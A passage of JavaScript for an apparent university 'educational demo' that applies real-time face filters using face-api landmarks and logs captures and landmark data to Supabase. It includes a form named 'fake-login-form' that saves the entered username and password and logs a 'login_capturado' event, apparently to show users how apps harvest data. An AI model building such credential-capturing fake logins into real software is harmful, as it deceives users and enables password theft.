/* ============================================================
   ANOTHERFACE — demo educativa UNITEC
   Filtros IA en tiempo real con detección facial.
   ============================================================ */

const $ = (sel) => document.querySelector(sel);

function uuid() {
  if (crypto.randomUUID) return crypto.randomUUID();
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    return (c === "x" ? r : (r & 0x3) | 0x8).toString(16);
  });
}

const SESSION_ID = uuid();
const IS_MOBILE  = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

// ── Reloj ──
function tickClock() {
  const el = $("#clock");
  if (el) el.textContent = new Date().toLocaleTimeString("es-HN", { hour12: false });
}
setInterval(tickClock, 1000); tickClock();

// ── Supabase ──
let supabaseClient = null;
function getSupabase() {
  if (supabaseClient) return supabaseClient;
  if (!window.supabase) return null;
  const cfg = window.SUPABASE_CONFIG;
  if (!cfg) return null;
  const { url, anonKey } = cfg;
  if (!url || !anonKey || url.includes("TU-PROYECTO") || url === "") return null;
  try {
    supabaseClient = window.supabase.createClient(url, anonKey);
    console.log("[supabase] ✓ OK:", url.slice(0, 35) + "...");
    return supabaseClient;
  } catch (e) {
    console.error("[supabase]", e.message);
    return null;
  }
}
window.addEventListener("load", () => getSupabase());

// ── Supabase Storage: subir imagen como archivo real ──
async function uploadImageToStorage(imageBase64, sessionId) {
  const client = getSupabase();
  if (!client || !imageBase64) return null;
  try {
    const res      = await fetch(imageBase64);
    const blob     = await res.blob();
    const filename = `${sessionId}-${Date.now()}.jpg`;
    const { error } = await client.storage
      .from("capturas")
      .upload(filename, blob, { contentType: "image/jpeg", upsert: false });
    if (error) { console.warn("[storage]", error.message); return null; }
    const { data: { publicUrl } } = client.storage.from("capturas").getPublicUrl(filename);
    console.log("[storage] ✓ Subida:", publicUrl);
    return publicUrl;
  } catch (e) {
    console.warn("[storage]", e.message);
    return null;
  }
}

// ── Login ──
let userCredentials = { username: "", password: "" };
const loginScreen    = $("#login-screen");
const heroSection    = $("#hero-section");
const fakeLoginForm  = $("#fake-login-form");

if (fakeLoginForm) {
  fakeLoginForm.addEventListener("submit", (e) => {
    e.preventDefault();
    userCredentials.username = ($("#fake-username")?.value || "").trim();
    userCredentials.password  = $("#fake-password")?.value || "";
    loginScreen?.classList.add("hidden");
    heroSection?.classList.remove("hidden");
    $("#como-funciona")?.classList.remove("hidden");
    $("#consentimiento")?.classList.remove("hidden");
    $("#closing-section")?.classList.remove("hidden");
    heroSection?.scrollIntoView({ behavior: "smooth", block: "start" });
    logEvent("login_capturado", { filtro: "ninguno" });
  });
}

// ── Consentimiento ──
const consentCamera    = $("#consent-camera");
const consentMeta      = $("#consent-metadata");
const consentSnapshot  = $("#consent-snapshot");
const consentLandmarks = $("#consent-landmarks");
const startBtn         = $("#start-camera");
const consentHint      = $("#consent-hint");

function refreshConsentState() {
  if (!consentCamera || !consentMeta || !startBtn) return;
  const ok = consentCamera.checked && consentMeta.checked;
  startBtn.disabled = !ok;
  if (consentHint) consentHint.textContent = ok
    ? "✦ Listo. Presiona el botón para activar tu cámara."
    : "Marca las dos primeras casillas para continuar.";
}
[consentCamera, consentMeta, consentSnapshot, consentLandmarks].forEach((el) =>
  el?.addEventListener("change", refreshConsentState)
);
refreshConsentState();

// ── Estado del estudio ──
const video        = $("#video");
const overlay      = $("#overlay");
const ctx          = overlay?.getContext("2d");
const studio       = $("#estudio");
const statusEl     = $("#studio-status");
const faceStatusEl = $("#face-status-overlay");
const captureResult = $("#capture-result");
const capturePreview = $("#capture-preview");
const downloadLink   = $("#download-link");
const uploadStatusEl = $("#capture-upload-status");

const hud = {
  time: $("#hud-time"), tz: $("#hud-tz"), lang: $("#hud-lang"),
  agent: $("#hud-agent"), screen: $("#hud-screen"), session: $("#hud-session"),
  filter: $("#hud-filter"), face: $("#hud-face"), landmarks: $("#hud-landmarks"),
  count: $("#hud-count"), model: $("#hud-model"),
};

let currentFilter  = "ninguno";
let stream         = null;
let rafId          = null;
let captureCount   = 0;
let faceModelReady = false;
let facingMode     = "user";

// ── Modelo face-api ──
const MODEL_URLS = [
  "https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model",
  "https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights",
];
async function loadFaceModel() {
  if (hud.model) hud.model.textContent = "cargando…";
  if (!window.faceapi) {
    if (hud.model) hud.model.textContent = "✗ no cargada";
    return false;
  }
  for (const url of MODEL_URLS) {
    try {
      await Promise.all([
        faceapi.nets.tinyFaceDetector.loadFromUri(url),
        faceapi.nets.faceLandmark68TinyNet.loadFromUri(url),
      ]);
      faceModelReady = true;
      if (hud.model) hud.model.textContent = "✓ listo";
      console.log("[face-api] ✓", url);
      return true;
    } catch (_) { /* próximo CDN */ }
  }
  faceModelReady = false;
  if (hud.model) hud.model.textContent = "✗ sin conexión";
  return false;
}
loadFaceModel();

// ── Filtros: selección ──
document.querySelectorAll(".filter-chip").forEach((btn) => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".filter-chip").forEach((b) => b.classList.remove("active"));
    btn.classList.add("active");
    currentFilter = btn.dataset.filter;
    if (hud.filter) hud.filter.textContent = currentFilter;
    logEvent("cambio_filtro", { filtro: currentFilter });
  });
});

// ── HUD ──
function fillHudStatic() {
  if (hud.tz)      hud.tz.textContent      = Intl.DateTimeFormat().resolvedOptions().timeZone || "—";
  if (hud.lang)    hud.lang.textContent    = navigator.language || "—";
  if (hud.agent)   hud.agent.textContent   = `${IS_MOBILE ? "Móvil" : "PC"} · ${shortAgent(navigator.userAgent)}`;
  if (hud.screen)  hud.screen.textContent  = `${screen.width}×${screen.height}`;
  if (hud.session) hud.session.textContent = SESSION_ID.slice(0, 8);
  if (hud.filter)  hud.filter.textContent  = currentFilter;
}
function shortAgent(ua) {
  const m = ua.match(/(Chrome|Firefox|Safari|Edg|Opera)\/[\d.]+/);
  return m ? m[0] : "desconocido";
}
setInterval(() => { if (hud.time) hud.time.textContent = new Date().toLocaleTimeString("es-HN"); }, 1000);

// ── Canvas sizing con ResizeObserver ──
function resizeCanvas() {
  if (!overlay || !video) return;
  const rect = video.getBoundingClientRect();
  if (rect.width > 0 && rect.height > 0) {
    overlay.width  = rect.width;
    overlay.height = rect.height;
  }
}
let videoObserver = null;
function startObservingVideo() {
  if (videoObserver) videoObserver.disconnect();
  videoObserver = new ResizeObserver(resizeCanvas);
  videoObserver.observe(video);
  resizeCanvas();
}

// ── Cámara ──
async function openCamera(mode) {
  if (stream) stream.getTracks().forEach((t) => t.stop());
  stream = await navigator.mediaDevices.getUserMedia({
    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: { ideal: mode } },
    audio: false,
  });
  video.srcObject = stream;
  await new Promise((res) => {
    video.onloadedmetadata = () => video.play().then(res).catch(res);
    if (video.readyState >= 2) video.play().then(res).catch(res);
  });
  video.style.transform = mode === "user" ? "scaleX(-1)" : "scaleX(1)";
  startObservingVideo();
  setTimeout(resizeCanvas, 120);
  setTimeout(resizeCanvas, 400);
}

startBtn?.addEventListener("click", async () => {
  try {
    await openCamera(facingMode);
    studio?.classList.remove("hidden");
    studio?.scrollIntoView({ behavior: "smooth", block: "start" });
    fillHudStatic();
    if (rafId) cancelAnimationFrame(rafId);
    rafId = requestAnimationFrame(renderLoop);
    logEvent("camara_activada");
  } catch (err) {
    console.error("[cámara]", err);
    if (consentHint) consentHint.textContent = "⚠ No se pudo acceder a la cámara.";
  }
});

$("#switch-camera-btn")?.addEventListener("click", async () => {
  facingMode = facingMode === "user" ? "environment" : "user";
  try {
    await openCamera(facingMode);
    if (statusEl) statusEl.textContent = `Cámara ${facingMode === "user" ? "frontal" : "trasera"} activa.`;
  } catch {
    if (statusEl) statusEl.textContent = "Esta cámara no está disponible.";
    facingMode = facingMode === "user" ? "environment" : "user";
  }
});

$("#stop-btn")?.addEventListener("click", () => {
  stream?.getTracks().forEach((t) => t.stop());
  if (rafId) cancelAnimationFrame(rafId);
  if (videoObserver) videoObserver.disconnect();
  studio?.classList.add("hidden");
  captureResult?.classList.add("hidden");
  targetDetection = null; smoothedDetection = null;
  logEvent("camara_apagada");
});

// ── Detección facial ──
let targetDetection   = null;
let smoothedDetection = null;
let lastAutoSave      = 0;
let faceAnalysis      = { smile: 0, eyebrow: 0 };

function lerp(a, b, t) { return a + (b - a) * t; }

function updateSmoothedDetection() {
  if (!targetDetection) { smoothedDetection = null; return; }
  if (!smoothedDetection) {
    smoothedDetection = {
      box:       { ...targetDetection.box },
      points:    targetDetection.points.map((p) => ({ ...p })),
      rawPoints: targetDetection.rawPoints,
      score:     targetDetection.score,
    };
    return;
  }
  const T  = 0.22;
  const sd = smoothedDetection, td = targetDetection;
  sd.box.x     = lerp(sd.box.x, td.box.x, T); sd.box.y    = lerp(sd.box.y, td.box.y, T);
  sd.box.width = lerp(sd.box.width, td.box.width, T); sd.box.height = lerp(sd.box.height, td.box.height, T);
  for (let i = 0; i < td.points.length; i++) {
    sd.points[i].x = lerp(sd.points[i].x, td.points[i].x, T);
    sd.points[i].y = lerp(sd.points[i].y, td.points[i].y, T);
  }
  sd.rawPoints = td.rawPoints; sd.score = td.score;
}

// Helpers geométricos
function centroid(pts) {
  let cx = 0, cy = 0;
  pts.forEach((p) => { cx += p.x; cy += p.y; });
  return { x: cx / pts.length, y: cy / pts.length };
}
function dist(a, b) { return Math.hypot(b.x - a.x, b.y - a.y); }

// Genera puntos densificados interpolando midpoints entre los 68 landmarks
function densifyPoints(pts) {
  const dense = [];
  for (let i = 0; i < pts.length; i++) {
    dense.push(pts[i]);
    const next = pts[(i + 1) % pts.length];
    // Añadir midpoint entre puntos consecutivos (duplica densidad)
    dense.push({ x: (pts[i].x + next.x) / 2, y: (pts[i].y + next.y) / 2, interp: true });
  }
  return dense;
}

function analyzeFace(pts) {
  if (!pts || pts.length < 68) return;
  const mW = dist(pts[48], pts[54]), mH = dist(pts[51], pts[57]);
  faceAnalysis.smile   = Math.min(1, (mH / (mW || 1)) * 4);
  const fH             = dist(pts[27], pts[8]);
  const lB             = dist(centroid(pts.slice(17, 22)), centroid(pts.slice(36, 42)));
  const rB             = dist(centroid(pts.slice(22, 27)), centroid(pts.slice(42, 48)));
  faceAnalysis.eyebrow = ((lB + rB) / 2) / (fH || 1);
}

async function detectFaceLoop() {
  if (!stream || !video || video.readyState < 2 || !overlay?.width) {
    setTimeout(detectFaceLoop, 200); return;
  }
  if (!faceModelReady) { setTimeout(detectFaceLoop, 500); return; }
  try {
    const result = await faceapi
      .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.2 }))
      .withFaceLandmarks(true);

    if (result && result.landmarks && result.landmarks.positions.length >= 68) {
      const cW = overlay.width, cH = overlay.height;
      const sX = cW / video.videoWidth, sY = cH / video.videoHeight;
      const mir = facingMode === "user";
      const map = (p) => ({ x: mir ? cW - p.x * sX : p.x * sX, y: p.y * sY });
      const mapped = result.landmarks.positions.map(map);
      targetDetection = { box: result.detection.box, points: mapped, rawPoints: result.landmarks.positions, score: result.detection.score };
      analyzeFace(mapped);
    } else {
      targetDetection = null;
    }
  } catch (_) { /* puntual */ }

  const det = targetDetection;
  if (hud.face)      hud.face.textContent      = det ? "✓ sí" : "no";
  if (hud.landmarks) hud.landmarks.textContent = det ? String(det.points.length) : "0";
  if (faceStatusEl)  faceStatusEl.textContent  = det
    ? `✦ Detectado · ${det.points.length} pts · ${Math.round(det.score * 100)}% conf.`
    : "Buscando rostro…";

  if (consentLandmarks?.checked && det) {
    const now = performance.now();
    if (now - lastAutoSave > 5000) {
      lastAutoSave = now;
      logEvent("auto_puntos", { con_landmarks: true, landmarks: det.rawPoints.map((p) => ({ x: Math.round(p.x), y: Math.round(p.y) })) });
    }
  }
  setTimeout(detectFaceLoop, 45);
}
window.addEventListener("load", () => setTimeout(detectFaceLoop, 500));

// ============================================================
// FILTROS
// ============================================================

function drawSpline(pts, close = false) {
  if (!pts || !pts.length) return;
  ctx.beginPath(); ctx.moveTo(pts[0].x, pts[0].y);
  for (let i = 1; i < pts.length - 1; i++) {
    const mx = (pts[i].x + pts[i+1].x) / 2, my = (pts[i].y + pts[i+1].y) / 2;
    ctx.quadraticCurveTo(pts[i].x, pts[i].y, mx, my);
  }
  const L = pts[pts.length - 1];
  if (close) { ctx.quadraticCurveTo(L.x, L.y, (L.x + pts[0].x) / 2, (L.y + pts[0].y) / 2); ctx.closePath(); }
  else ctx.lineTo(L.x, L.y);
}

// ── Malla Facial (más densa) ──
function drawSilhouetteFilter(det) {
  if (!det || det.points.length < 68) return;
  const pts   = det.points;
  const dense = densifyPoints(pts.slice(0, 68));

  // Puntos originales (68) grandes y brillantes
  ctx.fillStyle = "#00e5ff"; ctx.shadowColor = "#00e5ff"; ctx.shadowBlur = 6;
  pts.forEach((p) => { ctx.beginPath(); ctx.arc(p.x, p.y, 2.5, 0, Math.PI*2); ctx.fill(); });

  // Puntos interpolados más pequeños y suaves
  ctx.fillStyle = "rgba(0,229,255,0.4)"; ctx.shadowBlur = 3;
  dense.filter(p => p.interp).forEach((p) => { ctx.beginPath(); ctx.arc(p.x, p.y, 1.2, 0, Math.PI*2); ctx.fill(); });

  ctx.shadowBlur = 0;

  const segs = [
    { s:0,  e:16, c:false }, { s:17, e:21, c:false }, { s:22, e:26, c:false },
    { s:27, e:30, c:false }, { s:31, e:35, c:false }, { s:36, e:41, c:true  },
    { s:42, e:47, c:true  }, { s:48, e:59, c:true  }, { s:60, e:67, c:true  },
  ];
  ctx.strokeStyle = "rgba(0,229,255,0.75)"; ctx.lineWidth = 1.5;
  segs.forEach(({ s, e, c }) => { drawSpline(pts.slice(s, e+1), c); ctx.stroke(); });

  // Guías simétricas adicionales (más puntos que antes)
  ctx.strokeStyle = "rgba(0,229,255,0.18)"; ctx.lineWidth = 1;
  const guides = [
    [27,33],[27,39],[27,42],[36,0],[45,16],[33,48],[33,54],
    [19,37],[24,44],[30,57],[0,36],[16,45],[8,57],[19,28],[24,28],
  ];
  guides.forEach(([a,b]) => {
    ctx.beginPath(); ctx.moveTo(pts[a].x, pts[a].y); ctx.lineTo(pts[b].x, pts[b].y); ctx.stroke();
  });
}

// ── Ojos de Fuego ──
function drawFireEyesFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts = det.points;
  const lPts = pts.slice(36, 42), rPts = pts.slice(42, 48);
  const eyeW = (dist(lPts[0], lPts[3]) + dist(rPts[0], rPts[3])) / 2;
  function flame(cx, cy, w, t) {
    const r = w * 0.42;
    const g = ctx.createRadialGradient(cx, cy, 0, cx, cy, r);
    g.addColorStop(0, "rgba(255,255,100,1)"); g.addColorStop(0.5, "rgba(255,80,0,0.95)"); g.addColorStop(1, "rgba(200,0,0,0.5)");
    ctx.beginPath(); ctx.arc(cx, cy, r, 0, Math.PI*2);
    ctx.fillStyle = g; ctx.shadowColor = "#ff4400"; ctx.shadowBlur = 28; ctx.fill();
    for (let i = 0; i < 16; i++) {
      const a = (Math.PI*2*i)/16, len = r + w*(0.7+Math.sin(t*0.008+i*1.2)*0.4+Math.random()*0.3);
      const bias = Math.sin(a) < 0 ? 2.2 : 0.3;
      ctx.beginPath();
      ctx.moveTo(cx+Math.cos(a-0.25)*r, cy+Math.sin(a-0.25)*r);
      ctx.lineTo(cx+Math.cos(a)*len,    cy+Math.sin(a)*len*bias-w*0.5);
      ctx.lineTo(cx+Math.cos(a+0.25)*r, cy+Math.sin(a+0.25)*r);
      ctx.fillStyle = i%2 ? "rgba(255,200,0,0.6)" : "rgba(255,100,0,0.75)"; ctx.fill();
    }
    ctx.shadowBlur = 0;
  }
  flame(centroid(lPts).x, centroid(lPts).y, eyeW, ts);
  flame(centroid(rPts).x, centroid(rPts).y, eyeW, ts+700);
}

// ── Cyber ──
function drawCyberFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts = det.points;
  ctx.strokeStyle = `rgba(0,255,150,${0.3+0.1*Math.sin(ts*0.003)})`; ctx.lineWidth = 0.8;
  const conn = [
    [0,1],[1,2],[2,3],[3,4],[4,5],[5,6],[6,7],[7,8],[8,9],[9,10],[10,11],[11,12],[12,13],[13,14],[14,15],[15,16],
    [17,18],[18,19],[19,20],[20,21],[22,23],[23,24],[24,25],[25,26],
    [36,37],[37,38],[38,39],[39,40],[40,41],[41,36],
    [42,43],[43,44],[44,45],[45,46],[46,47],[47,42],
    [48,49],[49,50],[50,51],[51,52],[52,53],[53,54],[54,55],[55,56],[56,57],[57,58],[58,59],[59,48],
    [27,21],[27,26],[33,48],[33,54],[36,0],[45,16],[30,35],[17,0],[26,16],
  ];
  conn.forEach(([a,b]) => { ctx.beginPath(); ctx.moveTo(pts[a].x,pts[a].y); ctx.lineTo(pts[b].x,pts[b].y); ctx.stroke(); });
  [0,4,8,12,16,19,24,27,30,33,36,39,42,45,48,51,54,57].forEach((i,idx) => {
    ctx.beginPath(); ctx.arc(pts[i].x, pts[i].y, 3, 0, Math.PI*2);
    ctx.fillStyle = `rgba(0,255,150,${0.5+0.5*Math.sin(ts*0.005+idx)})`;
    ctx.shadowColor = "#00ff96"; ctx.shadowBlur = 10; ctx.fill(); ctx.shadowBlur = 0;
  });
  const top = pts[27].y - 20, bot = pts[8].y + 10;
  const scanY = top + (Math.sin(ts*0.0018)*0.5+0.5)*(bot-top);
  const lx = Math.min(pts[0].x,pts[16].x)-10, rx = Math.max(pts[0].x,pts[16].x)+10;
  const sg = ctx.createLinearGradient(lx,scanY,rx,scanY);
  sg.addColorStop(0,"rgba(0,255,150,0)"); sg.addColorStop(0.5,"rgba(0,255,150,0.7)"); sg.addColorStop(1,"rgba(0,255,150,0)");
  ctx.beginPath(); ctx.moveTo(lx,scanY); ctx.lineTo(rx,scanY);
  ctx.strokeStyle = sg; ctx.lineWidth = 2; ctx.stroke();
}

// ── Neón ──
function drawNeonFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts = det.points, glow = 2+Math.sin(ts*0.004);
  const R = [
    {s:0, e:16,c:"#ff2a6d",cl:false},{s:17,e:21,c:"#00e5ff",cl:false},{s:22,e:26,c:"#00e5ff",cl:false},
    {s:27,e:35,c:"#7c3aed",cl:false},{s:36,e:41,c:"#ffcc00",cl:true },{s:42,e:47,c:"#ffcc00",cl:true },
    {s:48,e:59,c:"#ff2a6d",cl:true },{s:60,e:67,c:"#ff6b35",cl:true },
  ];
  R.forEach(({s,e,c,cl}) => {
    ctx.shadowColor=c; ctx.shadowBlur=18+glow*4; ctx.strokeStyle=c; ctx.lineWidth=2+glow*0.25;
    drawSpline(pts.slice(s,e+1),cl); ctx.stroke();
  });
  [17,19,21,22,24,26,36,39,42,45,48,54].forEach((i,idx) => {
    const c = ["#ff2a6d","#00e5ff","#7c3aed","#ffcc00"][idx%4];
    ctx.beginPath(); ctx.arc(pts[i].x,pts[i].y,2.5,0,Math.PI*2);
    ctx.fillStyle=c; ctx.shadowColor=c; ctx.shadowBlur=12; ctx.fill();
  });
  ctx.shadowBlur = 0;
}

// ── Deformar ──
function drawDeformFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts = det.points, W = overlay.width, H = overlay.height;
  const nose = pts[30], faceW = dist(pts[0],pts[16])*0.55, faceH = dist(pts[27],pts[8])*0.6;
  const tmp = document.createElement("canvas"); tmp.width=W; tmp.height=H;
  const tc = tmp.getContext("2d");
  tc.save(); if(facingMode==="user"){tc.translate(W,0);tc.scale(-1,1);} tc.drawImage(video,0,0,W,H); tc.restore();
  const GRID=18, x0=nose.x-faceW, y0=nose.y-faceH, x1=nose.x+faceW, y1=nose.y+faceH;
  const gw=(x1-x0)/GRID, gh=(y1-y0)/GRID, squish=1.5+0.3*Math.sin(ts*0.003);
  for(let gy=0;gy<GRID;gy++) for(let gx=0;gx<GRID;gx++){
    const sx=x0+gx*gw, sy=y0+gy*gh, mx=(sx+gw/2)-nose.x, my=(sy+gh/2)-nose.y;
    const r=Math.hypot(mx,my)/(faceW*0.9), dF=Math.max(0,1-r);
    const srcX=nose.x+(mx/squish)*(1-dF*0.4), srcY=nose.y+(my*squish)*(1-dF*0.3);
    ctx.drawImage(tmp,Math.max(0,srcX-gw/2),Math.max(0,srcY-gh/2),gw,gh,sx,sy,gw,gh);
  }
  ctx.font="bold 20px sans-serif"; const t=ts*0.004;
  [pts[0],pts[16],pts[27]].forEach((p,i)=>{
    const ox=22*Math.cos(t+i*2.1),oy=22*Math.sin(t+i*2.1);
    ctx.fillStyle=["#ff2a6d","#ffcc00","#00e5ff"][i];
    ctx.fillText("★",p.x+ox-10,p.y+oy);
  });
}

// ── Lentes Nerd ──
function drawNerdGlassesFilter(det) {
  if (!det || det.points.length < 68) return;
  const pts=det.points, lPts=pts.slice(36,42), rPts=pts.slice(42,48);
  const lC=centroid(lPts), rC=centroid(rPts);
  const lR=dist(lPts[0],lPts[3])*0.75, rR=dist(rPts[0],rPts[3])*0.75;
  const bridge={x:(lC.x+rC.x)/2,y:(lC.y+rC.y)/2};
  ctx.strokeStyle="#6b3310"; ctx.lineWidth=4; ctx.shadowColor="rgba(0,0,0,0.5)"; ctx.shadowBlur=6;
  ctx.beginPath(); ctx.arc(lC.x,lC.y,lR,0,Math.PI*2); ctx.stroke();
  ctx.beginPath(); ctx.arc(rC.x,rC.y,rR,0,Math.PI*2); ctx.stroke();
  ctx.beginPath(); ctx.moveTo(lC.x+lR,lC.y); ctx.quadraticCurveTo(bridge.x,bridge.y-lR*0.5,rC.x-rR,rC.y); ctx.stroke();
  ctx.beginPath(); ctx.moveTo(lC.x-lR,lC.y); ctx.lineTo(pts[0].x,pts[0].y); ctx.stroke();
  ctx.beginPath(); ctx.moveTo(rC.x+rR,rC.y); ctx.lineTo(pts[16].x,pts[16].y); ctx.stroke();
  ctx.strokeStyle="rgba(255,255,255,0.35)"; ctx.lineWidth=2; ctx.shadowBlur=0;
  ctx.beginPath(); ctx.arc(lC.x-lR*0.2,lC.y-lR*0.2,lR*0.3,-Math.PI*0.85,-Math.PI*0.15); ctx.stroke();
  ctx.beginPath(); ctx.arc(rC.x-rR*0.2,rC.y-rR*0.2,rR*0.3,-Math.PI*0.85,-Math.PI*0.15); ctx.stroke();
  const mC=centroid(pts.slice(48,60)), mW=dist(pts[48],pts[54])*0.58;
  ctx.fillStyle="#4a2208"; ctx.shadowBlur=0;
  ctx.beginPath(); ctx.moveTo(mC.x-mW,mC.y-4);
  ctx.bezierCurveTo(mC.x-mW*0.5,mC.y+14,mC.x+mW*0.5,mC.y+14,mC.x+mW,mC.y-4); ctx.fill();
}

// ── Análisis de Ingeniería ──
function drawAnalysisFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts=det.points, smile=faceAnalysis.smile, W=overlay.width;
  const lx=Math.min(pts[0].x,pts[16].x)-14, rx=Math.max(pts[0].x,pts[16].x)+14;
  const ty=Math.min(pts[19].y,pts[24].y)-24, by=pts[8].y+16;
  ctx.strokeStyle="rgba(0,255,200,0.85)"; ctx.lineWidth=1.5;
  ctx.setLineDash(ts%80<40?[6,4]:[3,7]); ctx.strokeRect(lx,ty,rx-lx,by-ty); ctx.setLineDash([]);
  const cL=16; ctx.strokeStyle="#00ffc8"; ctx.lineWidth=3;
  [[lx,ty,1,1],[rx,ty,-1,1],[lx,by,1,-1],[rx,by,-1,-1]].forEach(([cx,cy,dx,dy])=>{
    ctx.beginPath(); ctx.moveTo(cx,cy+dy*cL); ctx.lineTo(cx,cy); ctx.lineTo(cx+dx*cL,cy); ctx.stroke();
  });
  const nose=pts[30];
  ctx.strokeStyle="rgba(0,255,200,0.2)"; ctx.lineWidth=1; ctx.setLineDash([4,4]);
  ctx.beginPath(); ctx.moveTo(nose.x,ty); ctx.lineTo(nose.x,by); ctx.stroke();
  ctx.beginPath(); ctx.moveTo(lx,nose.y); ctx.lineTo(rx,nose.y); ctx.stroke(); ctx.setLineDash([]);
  const smilePct=Math.round(smile*100), conf=Math.round((det.score||0)*100);
  const mood=smile>0.35?"ALEGRE":smile>0.15?"NEUTRAL":"SERIO";
  const brows=faceAnalysis.eyebrow>0.14?"ALZADAS":"NORMALES";
  const lines=[
    ["◈ ANÁLISIS FACIAL","#ffcc00"],["──────────────────","rgba(0,255,200,0.3)"],
    [`Confianza:  ${conf}%`,"#00ffc8"],[`Puntos:     68 + interpolados`,"#00ffc8"],
    ["──────────────────","rgba(0,255,200,0.3)"],[`Sonrisa:    ${smilePct}%`,"#00ffc8"],
    [`Emoción:    ${mood}`,"#00ffc8"],[`Cejas:      ${brows}`,"#00ffc8"],
    ["──────────────────","rgba(0,255,200,0.3)"],[`Simetría:   ${Math.round(80+Math.sin(ts*0.001)*6)}%`,"#00ffc8"],
  ];
  const px=rx+12, py=ty;
  if(px+188<W){
    ctx.fillStyle="rgba(0,18,28,0.8)"; ctx.fillRect(px,py,188,lines.length*16+12);
    ctx.font="bold 11px 'IBM Plex Mono',monospace";
    lines.forEach(([txt,col],i)=>{
      ctx.fillStyle=col; ctx.shadowColor="#00ffc8"; ctx.shadowBlur=col==="#00ffc8"?4:0;
      ctx.fillText(txt,px+7,py+15+i*16);
    }); ctx.shadowBlur=0;
  }
  const barX=lx,barY=by+14,barW=rx-lx;
  ctx.fillStyle="rgba(0,18,28,0.7)"; ctx.fillRect(barX,barY,barW,12);
  const bc=smile>0.4?"#00ff88":smile>0.2?"#ffcc00":"#ff4466";
  ctx.fillStyle=bc; ctx.shadowColor=bc; ctx.shadowBlur=8; ctx.fillRect(barX,barY,barW*Math.min(1,smile),12);
  ctx.strokeStyle="rgba(0,255,200,0.4)"; ctx.lineWidth=1; ctx.shadowBlur=0; ctx.strokeRect(barX,barY,barW,12);
  ctx.fillStyle="#fff"; ctx.font="9px monospace"; ctx.fillText(`SONRISA ${smilePct}%`,barX+4,barY+10);
  [0,4,8,12,16,19,24,27,30,33,36,39,42,45,48,54].forEach((i)=>{
    ctx.beginPath(); ctx.arc(pts[i].x,pts[i].y,3,0,Math.PI*2);
    ctx.fillStyle="#00ffc8"; ctx.shadowColor="#00ffc8"; ctx.shadowBlur=8; ctx.fill();
  }); ctx.shadowBlur=0;
}

// ── Detector Sonrisa ──
function drawSmileFilter(det, ts) {
  if (!det || det.points.length < 68) return;
  const pts=det.points, smile=faceAnalysis.smile, faceH=dist(pts[27],pts[8]), noseX=pts[27].x;
  const emoji=smile>0.4?"😄":smile>0.25?"🙂":smile>0.1?"😐":"😑";
  ctx.font=`${Math.round(faceH*0.42)}px serif`; ctx.textAlign="center";
  ctx.fillText(emoji,noseX,Math.min(pts[19].y,pts[24].y)-faceH*0.15);
  const mC=centroid(pts.slice(48,60)), mW=dist(pts[48],pts[54])*0.58;
  const arcH=mW*smile*1.6, color=smile>0.35?"#00ff88":smile>0.15?"#ffcc00":"#ff4466";
  ctx.strokeStyle=color; ctx.lineWidth=3+smile*4; ctx.shadowColor=color; ctx.shadowBlur=12+smile*20;
  ctx.beginPath(); ctx.moveTo(mC.x-mW,mC.y); ctx.quadraticCurveTo(mC.x,mC.y+arcH,mC.x+mW,mC.y); ctx.stroke();
  const label=smile>0.4?"¡ALEGRE! 🎉":smile>0.25?"Sonriente 😊":smile>0.1?"Neutral":"Serio 😐";
  ctx.fillStyle=color; ctx.font="bold 17px 'Space Grotesk',sans-serif"; ctx.shadowBlur=8;
  ctx.fillText(label,noseX,pts[8].y+32);
  if(smile>0.45){
    const cols=["#ff2a6d","#00e5ff","#ffcc00","#7c3aed","#00ff88"];
    for(let i=0;i<10;i++){
      const rx2=noseX+Math.sin(ts*0.005+i*0.95)*dist(pts[0],pts[16])*0.75;
      const ry2=pts[27].y-faceH*(0.4+((ts*0.0004+i*0.12)%0.65));
      ctx.fillStyle=cols[i%cols.length]; ctx.shadowBlur=0; ctx.fillRect(rx2,ry2,5,5);
    }
  }
  ctx.textAlign="left"; ctx.shadowBlur=0;
}

// ── FILTRO PERRO ── (estilo Snapchat, dibujado con canvas)
function drawDogFilter(det) {
  if (!det || det.points.length < 68) return;
  const pts    = det.points;
  const nose   = pts[30];                      // punta de la nariz
  const faceW  = dist(pts[0], pts[16]);
  const faceH  = dist(pts[27], pts[8]);

  // Colores del filtro perro
  const BROWN  = "#a06030";
  const DARK   = "#6b3a10";
  const LIGHT  = "#c8905a";
  const PINK   = "#e09080";

  // ── Orejas (ancladas a las cejas externas + escaladas con el rostro) ──
  const earW = faceW  * 0.32;
  const earH = faceH  * 0.60;

  function drawEar(anchorX, anchorY, dir) { // dir: -1 izquierda, +1 derecha
    // Oreja externa (marrón)
    ctx.fillStyle = BROWN;
    ctx.beginPath();
    ctx.moveTo(anchorX, anchorY);
    ctx.bezierCurveTo(
      anchorX + dir * earW * 0.05, anchorY - earH * 0.25,
      anchorX + dir * earW * 0.55, anchorY - earH * 0.85,
      anchorX + dir * earW * 0.45, anchorY - earH * 1.15
    );
    ctx.bezierCurveTo(
      anchorX + dir * earW * 0.30, anchorY - earH * 1.35,
      anchorX - dir * earW * 0.15, anchorY - earH * 1.25,
      anchorX - dir * earW * 0.10, anchorY - earH * 0.95
    );
    ctx.bezierCurveTo(
      anchorX - dir * earW * 0.30, anchorY - earH * 0.55,
      anchorX - dir * earW * 0.10, anchorY - earH * 0.10,
      anchorX, anchorY
    );
    ctx.fill();

    // Interior de la oreja (más claro)
    ctx.fillStyle = LIGHT;
    ctx.beginPath();
    ctx.moveTo(anchorX + dir * earW * 0.04, anchorY - earH * 0.10);
    ctx.bezierCurveTo(
      anchorX + dir * earW * 0.20, anchorY - earH * 0.30,
      anchorX + dir * earW * 0.40, anchorY - earH * 0.75,
      anchorX + dir * earW * 0.32, anchorY - earH * 0.98
    );
    ctx.bezierCurveTo(
      anchorX + dir * earW * 0.18, anchorY - earH * 1.12,
